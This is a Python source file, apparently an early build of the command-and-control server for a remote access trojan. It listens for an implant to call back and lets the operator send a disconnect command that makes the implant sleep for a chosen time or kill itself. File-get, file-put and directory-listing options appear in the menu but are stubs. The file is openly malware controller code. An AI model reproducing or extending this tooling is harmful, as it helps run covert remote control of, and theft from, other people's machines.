# Patrick Sacchet
# This file is the main entrypoint for our C2 server functionality 
# Current supported functionality includes:
    # 'Diconnect' -> disconnect from implant; optionally either kill implant or set callback time
    # 'File-get' -> retrieve file off of target and copy it to local destination
    # 'File-put' -> copy a local file to destination on target
    # 'Dirlist' -> perform a directory listing on target

import socket
import ctypes

import Common
import File
import Dir


def handleDisconnect(sock) -> bool:
    # Ask user if they want to kill connection or set timeout (if kill connection set timeout to 0)
    callback = int(input("Number of seconds for implant to sleep before callback (0 to kill implant) > "))

    # DisconnectCommand -> CommandDetails -> Command
    disconnect_sleep = Common.DisconnectCommand(sleep=callback)
    disconnect_details = Common.CommandDetails(disconnectcommand=disconnect_sleep)
    disconnect_command = Common.Command(command=Common.Commands.disconnect, commanddetails=disconnect_details)

    bytes_sent = sock.send(bytes(disconnect_command))

    print(f"Sent {bytes_sent} bytes to implant")

    sock.close()

    return True


# Handle initial connection to our implant
def establishConnection(host_ip: str, host_port : int) -> socket.socket:
    print("Waiting for implant callout...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host_ip, host_port))
        sock.listen()
        conn, addr = sock.accept()
        print(f"Connection established to {addr[0]} on port {addr[1]}")

    except socket.error as e:
        print("ERROR: Failed to establish socket connection: {e}")
        return False

    return conn


# Simply helper function for printing commands for user
def printHelp() -> str:
    return 'Please choose from the following options: \n' \
    '\t 0) disconnect\n' \
    '\t 1) getfile\n' \
    '\t 2) putfile\n' \
    '\t 3) dirlist\n' 


# Main starting point for our RAT; implant will call back to our C2 when executed (with its configured port)
    # TODO: change this so we either call-out or wait for a call-in from our implant
def main():
    host_ip = '127.0.0.1'
    host_port = 0
    exit = False

    host_port = int(input("Please enter the port number on which you would like to listen for the RAT on > "))

    sock = establishConnection(host_ip, host_port)

    while (not exit):
        print(printHelp())
        choice = int(input('> '))
        match choice:
            case Common.Commands.disconnect:
                if (not handleDisconnect(sock)):
                    print("Failed disconnect!")
                exit = True
            case Common.Commands.getfile:
                return
            case Common.Commands.putfile:
                return
            case Common.Commands.dirlist:
                return
        



if __name__ == '__main__':
    main()